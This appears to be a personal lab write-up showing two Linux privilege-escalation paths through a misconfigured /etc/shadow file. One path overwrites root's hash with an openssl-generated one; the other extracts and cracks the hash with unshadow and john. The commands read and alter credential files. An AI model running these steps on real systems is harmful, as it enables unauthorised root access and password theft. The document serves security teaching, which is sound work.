# 🔐 Linux Privilege Escalation via /etc/shadow Misconfiguration

## 📌 Overview
In this lab, I investigated how misconfigured permissions on **`/etc/shadow`** can enable **privilege escalation to root**. Since `/etc/shadow` stores password hashes for local accounts, it should be strictly protected. If an attacker gains **read** or **write** access to this file, they can either **reset** the root password (write access) or **crack** the root hash offline (read access).

This exercise simulated a realistic post-exploitation scenario after obtaining an initial low-privileged shell.

---

## 🎯 Objectives
- Understand `/etc/shadow` structure and why it is protected
- Verify file permissions and identify security misconfigurations
- Escalate privileges via:
  - **Write access** → replace root password hash
  - **Read access** → extract + crack root hash using John the Ripper workflow
- Demonstrate impact and document defensive mitigations

---

## 🧠 Skills Demonstrated
- Linux authentication internals (`/etc/passwd` vs `/etc/shadow`)
- Permission auditing and misconfiguration detection
- Password hash generation + safe handling
- Offline hash cracking workflow (lab-safe)
- Privilege escalation methodology
- Security hardening recommendations

---

## 🛠️ Tools Used
- Linux: `ls`, `cat`, `grep`, `id`, `whoami`, `su`
- `openssl` (hash generation)
- `unshadow` (John the Ripper utility)
- `john` (password cracking)

---

## 🧪 Scenario 1 — Privilege Escalation with **Write Access** to `/etc/shadow`
A misconfiguration allowed a low-privileged user to **write** to `/etc/shadow`. That enables an attacker to **replace the root password hash** and then authenticate as root.

### Steps (Lab-safe summary)
```bash
# Confirm permissions (misconfigured case)
ls -alh /etc/shadow

# Identify the root entry
grep '^root:' /etc/shadow

# Generate a new password hash
openssl passwd -1 -salt ignite <new_password>

# Edit /etc/shadow and replace ONLY the hash field for root
# root:<new_hash>:...

# Switch to root using the new password
su root

```

### ✅ Result: Root access obtained by resetting the root hash in /etc/shadow.
Why this works: If an attacker can write to /etc/shadow, they can effectively set passwords for any account, including root.
## 🧪 Scenario 2 — Privilege Escalation with Read Access to /etc/shadow
In the second setup, the user had read access to /etc/shadow. That allows extraction of password hashes for offline cracking
```bash.
# Confirm permissions (readable shadow is a critical issue)
ls -alh /etc/shadow

# Combine passwd + shadow into a crackable format for John
unshadow /etc/passwd /etc/shadow > ~/shadow_crack.txt

# Crack only root's hash (lab environment)
john --users=root ~/shadow_crack.txt > cracked_passwords.txt

# Use cracked password to switch to root
su root
```
### ✅ Result: Root access obtained after cracking the root password hash offline.

### ✅ What unshadow Does (Quick Explanation)
unshadow merges user account info from /etc/passwd with hashes from /etc/shadow into a single file format that tools like john can process.
```bash.
unshadow /etc/passwd /etc/shadow > ~/shadow_crack.txt
```

Reads usernames from /etc/passwd


Matches them to hashes in /etc/shadow


Outputs username:hash:... format suitable for cracking
### 🏁 Result
Successfully demonstrated two privilege escalation paths caused by /etc/shadow exposure:
Write access → root password reset


Read access → root hash cracking → root login

